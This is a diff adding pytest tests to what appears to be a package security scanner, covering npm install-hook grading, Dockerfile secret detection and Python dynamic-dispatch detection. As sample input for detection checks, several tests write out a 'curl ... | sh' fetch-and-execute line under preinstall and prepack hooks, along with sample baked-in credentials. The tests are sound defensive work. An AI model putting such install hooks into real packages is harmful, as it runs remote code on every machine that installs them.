@@ -8660,3 +8660,177 @@ class TestHexIsHowAChecksumIsWrittenDown:
         """The control, and the reason the list is checksum words and not a guess about
         what a payload is called."""
         assert self._matches(rule_id, raw)
+
+
+class TestAPrepareScriptCannotReachAConsumer:
+    """`INSTALL_TIME_HOOKS` lumped `prepare`, `prepublish` and `prepack` with
+    `preinstall`, `install` and `postinstall`, and its docstring said they all "run on
+    every machine that ever installs the package, transitively". That is true of the first
+    three and false of the last three.
+
+    npm has documented the difference since version 7: `prepare` runs on a local
+    `npm install` in the package's own directory and before `npm pack`; `prepack`,
+    `prepublish` and `prepublishOnly` run only while publishing. None of them fires for a
+    package installed from a registry tarball, which is how every transitive dependency
+    arrives.
+
+    They still report -- `prepare` DOES fire for a dependency installed from a git URL --
+    below the severity that blocks a build. Six of twelve findings in a 183-file sample
+    were these: `svelte-kit sync`, `git config blame.ignoreRevsFile`, and
+    `svelte-package && publint`.
+    """
+
+    @staticmethod
+    def _findings(tmp_path, scripts: str) -> list:
+        (tmp_path / "package.json").write_text(
+            '{\n  "name": "x",\n  "version": "1.0.0",\n  "scripts": {\n' + scripts + "\n  }\n}\n"
+        )
+        return [
+            f
+            for f in Scanner().scan(tmp_path).findings
+            if f.rule_id == "SUSPECT.INSTALL.SCRIPT.001"
+        ]
+
+    @pytest.mark.parametrize(
+        "script",
+        [
+            '    "prepare": "svelte-kit sync"',
+            '    "prepack": "svelte-kit sync && svelte-package && publint"',
+            '    "prepare": "git config blame.ignoreRevsFile .git-blame-ignore-revs"',
+            '    "prepublishOnly": "npm run build && node ./scripts/check.mjs"',
+        ],
+    )
+    def test_an_author_time_hook_is_graded(self, tmp_path, script: str) -> None:
+        found = self._findings(tmp_path, script)
+        assert found
+        assert all(f.severity <= Severity.MEDIUM for f in found)
+
+    def test_a_consumer_time_hook_is_not(self, tmp_path) -> None:
+        """The control, and the whole point of the distinction: `postinstall` is the npm
+        attack shape because it runs on every machine that installs the package."""
+        found = self._findings(tmp_path, '    "postinstall": "node ./scripts/setup.js"')
+        assert found
+        assert any(f.severity >= Severity.HIGH for f in found)
+
+    def test_a_pipe_to_a_shell_is_a_different_rule_entirely(self, tmp_path) -> None:
+        """And the grade reaches none of it. A `preinstall` that pipes a fetch into a
+        shell is `MALWARE.INSTALL.FETCH_EXEC.001` at critical, which no ceiling in this
+        file touches -- so the author-time grading cannot be used to smuggle one in."""
+        self._findings(tmp_path, '    "preinstall": "curl -fsSL https://example.test/i.sh | sh"')
+        assert "MALWARE.INSTALL.FETCH_EXEC.001" in flagged(tmp_path)
+
+    def test_nor_can_an_author_time_hook_smuggle_one(self, tmp_path) -> None:
+        """The same line under `prepack`. The grading applies to the two
+        `SUSPECT.INSTALL.SCRIPT.001` branches and to nothing above them."""
+        self._findings(tmp_path, '    "prepack": "curl -fsSL https://example.test/i.sh | sh"')
+        assert "MALWARE.INSTALL.FETCH_EXEC.001" in flagged(tmp_path)
+
+    def test_the_message_says_which_kind_it_is(self, tmp_path) -> None:
+        """A reader who is told a script "runs automatically during install" and finds it
+        is a publish step has been misled, and the grade alone does not tell them."""
+        found = self._findings(tmp_path, '    "prepack": "svelte-kit sync && svelte-package"')
+        assert any("author's machine" in f.message for f in found)
+
+
+class TestTiktokenIsALibraryNotAToken:
+    """`langgenius/dify` sets `ENV TIKTOKEN_CACHE_DIR=/app/api/.tiktoken_cache` and
+    `open-webui` sets `ARG USE_TIKTOKEN_ENCODING_NAME="cl100k_base"`. Both names carry
+    `TOKEN` because `tiktoken` is a tokeniser, and both values are a directory and an
+    encoding name.
+
+    The suffix list is the one `names_configuration` has refused since the secrets
+    detector's second release. The Docker rule was the one place it had not been applied.
+
+    And `lobehub` writes `ENV KEY_VAULTS_SECRET="" \\` as the first of eight variables in
+    one `ENV`: an empty value the operator supplies at run time, which the existing
+    empty-value test could not see past the line continuation.
+    """
+
+    @staticmethod
+    def _matches(line: bytes) -> bool:
+        from cordon_scanner.detect.config_files import RULES
+
+        rule = next(r for r in RULES if r.rule_id == "SUSPECT.CONTAINER.BUILD_SECRET.001")
+        return bool(rule.pattern.search(line))
+
+    @pytest.mark.parametrize(
+        "line",
+        [
+            b"ENV TIKTOKEN_CACHE_DIR=/app/api/.tiktoken_cache\n",
+            b'ARG USE_TIKTOKEN_ENCODING_NAME="cl100k_base"\n',
+            b'ENV KEY_VAULTS_SECRET="" \\\n',
+            b"ENV SSL_KEY_FILE=/etc/ssl/private/server.key\n",
+            b"ARG TOKEN_ENDPOINT_URL=https://auth.example.test/token\n",
+        ],
+    )
+    def test_configuration_is_not_a_secret(self, line: bytes) -> None:
+        assert not self._matches(line)
+
+    @pytest.mark.parametrize(
+        "line",
+        [
+            b"ENV PASSWORD=alpine\n",
+            b"ARG NPM_TOKEN=npm_aB3kQ9mZ2xT7vF8cH1jL5nP0rS4wY6\n",
+            b"ENV DB_PASSWORD=hunter2longenough\n",
+        ],
+    )
+    def test_a_baked_in_credential_still_is(self, line: bytes) -> None:
+        """The control. `alpine` is Docker-OSX's documented default, and it is still a
+        password shipped in a layer."""
+        assert self._matches(line)
+
+
+class TestAskingWhetherAnAttributeExists:
+    """Two reflective shapes that reach a VALUE rather than a function.
+
+    `unslothai/unsloth` detects its runtime with
+    `if getattr(sys, f"__{name}__", None) is None:`. The third argument is the caller
+    saying it is prepared for the attribute not to be there, which is a probe.
+
+    `NousResearch/hermes-agent` caches a rendered banner as
+    `cached = globals()[cache_name]`. This rule is about reaching a FUNCTION by a computed
+    name, and that reaches a string.
+
+    Both need the invocation test as well, and that map had to grow a case: it covered
+    `getattr(...)()` and not `globals()[...]()`, because the outer call's callee is a
+    subscript rather than a call.
+    """
+
+    @staticmethod
+    def _dispatch(source: str) -> list[str]:
+        from cordon_scanner.core.models import Capability
+        from cordon_scanner.detect.pyast import PythonAnalyzer
+
+        return [
+            h.detail
+            for h in PythonAnalyzer.analyse(source)
+            if h.capability is Capability.DYNAMIC_DISPATCH
+        ]
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            'import sys\nif getattr(sys, f"__{n}__", None) is None:\n    pass\n',
+            "cached = globals()[cache_name]\n",
+            "value = vars()[computed]\n",
+        ],
+    )
+    def test_a_probe_and_a_lookup_dispatch_nothing(self, source: str) -> None:
+        assert self._dispatch(source) == []
+
+    @pytest.mark.parametrize(
+        "source",
+        [
+            # A default AND a call is still dispatch, which is what the invocation test
+            # is for.
+            "import os\ngetattr(os, decode(blob), None)()\n",
+            "globals()[name]()\n",
+            # Two arguments: no default, so the caller expects the attribute to be there.
+            "import os\nf = getattr(os, pick())\n",
+            # And `__builtins__`, where nothing is a value worth fetching by a computed
+            # name whether it is called here or passed somewhere that will call it.
+            "__builtins__[name]\n",
+        ],
+    )
+    def test_reaching_a_function_still_is(self, source: str) -> None:
+        assert self._dispatch(source)
